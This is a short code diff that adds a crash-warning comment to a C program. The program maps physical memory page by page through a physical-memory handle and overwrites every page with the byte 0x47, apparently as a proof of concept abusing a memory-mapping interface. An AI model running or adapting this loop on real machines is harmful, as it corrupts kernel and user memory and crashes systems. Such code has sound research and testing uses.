@@ -63,7 +63,9 @@ int main(char argc, char** argv)
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-
+	/*
+	Trying to write 0x100000000 to 0x150000000 will cause the system to crash
+	*/
 	for (__int64 page = 0x100000000; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
 		MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf);
 		memset(buf, 0x47, 0x1000);
